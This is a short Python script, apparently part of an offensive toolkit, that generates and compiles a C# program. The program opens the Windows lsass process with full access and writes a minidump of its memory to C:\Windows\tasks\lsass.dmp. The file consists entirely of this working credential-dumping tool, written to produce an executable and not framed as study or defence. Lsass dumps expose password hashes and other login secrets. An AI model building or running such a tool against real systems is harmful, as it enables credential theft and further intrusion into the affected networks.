#!/bin/env python3
import ak

FN_BASE = "win_minidump"
FN_CS = FN_BASE + ".cs"
FN_EXE = FN_BASE + ".exe"

template = r"""
using System;
using System.Diagnostics;
using System.Runtime.InteropServices; using System.IO;
namespace MiniDump
{
class Program
{
[DllImport("Dbghelp.dll")]
static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId,
IntPtr hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);
[DllImport("kernel32.dll")]
static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle,
int processId);
static void Main(string[] args) {
FileStream dumpFile = new FileStream("C:\\Windows\\tasks\\lsass.dmp", FileMode.Create);
Process[] lsass = Process.GetProcessesByName("lsass");

int lsass_pid = lsass[0].Id;
IntPtr handle = OpenProcess(0x001F0FFF, false, lsass_pid);
bool dumped = MiniDumpWriteDump(handle, lsass_pid, dumpFile.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
}
}
}
"""

ak.write_file(FN_CS, template)
ak.cs_compile(FN_CS, "/r:libraries/System.Data.SqlClient.dll /r:libraries/System.Data.dll")
